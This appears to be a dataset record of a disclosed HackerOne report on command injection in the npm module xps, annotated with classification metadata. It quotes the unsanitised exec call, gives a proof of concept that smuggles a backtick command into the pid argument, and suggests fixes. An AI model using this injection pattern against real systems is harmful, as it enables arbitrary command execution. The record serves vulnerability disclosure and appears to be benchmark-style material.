{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[xps] Command Injection via insecure command concatenation",
  "content": "\nI would like to report a Command Injection issue in the xps module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: xps\nversion: 1.0.2\nnpm page: https://www.npmjs.com/package/xps\nModule Description\nxps is a cross-platform library for listing and killing processes.\nModule Stats\n[10] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nHere's the code which causes the issue:\nCode 804 Bytes\n1// https://github.com/robotlolita/xps/blob/master/lib/linux.js#L48\n2...\n3var shell = require('./utils').shell;\n4... \n5exports.kill = kill;\n6function kill(pid) {\n7  return shell('kill', ['-9', pid]).map(K(undefined));  // <-- user's input\n8}\n9\n10// --------------------------------------------------\n11// https://github.com/robotlolita/xps/blob/master/lib/utils.js#L26\n12...\n13var exec    = require('child_process').exec;\n14...\n15var escapeArg = JSON.stringify;\n16...\n17exports.shell = shell;\n18function shell(cmd, args) {\n19  var command = cmd + ' ' + args.map(unary(compose(escapeArg)(String))).join(' '); // <-- injection\n20  return new Task(function(reject, resolve) {\n21    exec(command, function(error, stdout, stderr) {\n22      if (error)  reject(error);\n23      else        resolve({ output: stdout, error: stderr });\n24    });\n25  });\n26}\nThe argument pid is used to build the command that is passed to the child_process.exec function without any sanitization.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall xps module:\nnpm i xps\nnpm i xps\ncreate the following PoC JavaScript file (poc.js):\nCode 61 Bytes\n1const ps = require('xps');\n2ps.kill('`touch HACKED;`').fork();\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nIn this case it could be helpful to parse the pid as integer (var pid = parseInt(pid)).\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on a xps module via insecure command concatenation.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1595548260,
  "report_url": "https://hackerone.com/reports/865168",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a directory for testing: mkdir poc && cd poc"
    ],
    [
      2,
      "Install the xps module: npm i xps"
    ],
    [
      3,
      "Create a PoC JavaScript file (poc.js) with the following content: const ps = require('xps'); ps.kill('`touch HACKED;`').fork();"
    ],
    [
      4,
      "Execute the PoC file: node poc.js"
    ],
    [
      5,
      "Verify the creation of the HACKED file: ls"
    ]
  ],
  "vuln_description": "The xps module is vulnerable to command injection due to insecure command concatenation in the kill function, which uses user-supplied input (pid) without proper sanitization. This allows an attacker to execute arbitrary commands on the victim's system.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation in Node.js modules. The attack does not require multiple components or complex interactions; it simply exploits the lack of input sanitization in a single function call.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via insecure command concatenation in a Node.js module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by manipulating user sessions and resource IDs within the same application context, not command injection vulnerabilities in third-party modules.",
    "is_detectable": false
  }
}